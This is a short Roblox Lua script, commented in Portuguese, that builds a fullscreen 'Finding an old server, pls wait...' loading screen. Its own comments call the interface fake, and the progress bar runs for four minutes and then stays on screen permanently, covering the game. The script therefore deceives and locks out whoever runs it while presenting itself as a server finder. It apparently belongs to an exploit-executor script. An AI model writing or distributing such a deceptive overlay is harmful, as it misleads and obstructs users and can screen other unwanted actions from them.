-- Cria a interface falsa de loading, fullscreen e bonita
local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "ServerFinderUI"
gui.ResetOnSpawn = false

-- Tela preta fullscreen
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

-- Texto central
local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.4, 0)
title.BackgroundTransparency = 1
title.Text = "Finding an old server, pls wait..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold

-- Barra de progresso (fundo)
local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.6, 0, 0.03, 0)
barBg.Position = UDim2.new(0.2, 0, 0.52, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.ClipsDescendants = true
barBg.AnchorPoint = Vector2.new(0.5, 0.5)

-- Barra de progresso (preenchimento)
local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0

-- Porcentagem de carregamento
local percentText = Instance.new("TextLabel", bg)
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.57, 0)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = Color3.fromRGB(200, 200, 200)
percentText.TextScaled = true
percentText.Font = Enum.Font.Gotham

-- Animação da barra (4 minutos → 240 segundos)
task.spawn(function()
	local totalTime = 240
	for i = 1, 100 do
		local percent = i / 100
		barFill.Size = UDim2.new(percent, 0, 1, 0)
		percentText.Text = math.floor(percent * 100) .. "%"
		task.wait(totalTime / 100)
	end
	-- Quando chega em 100%, trava aí e não some nunca
end)
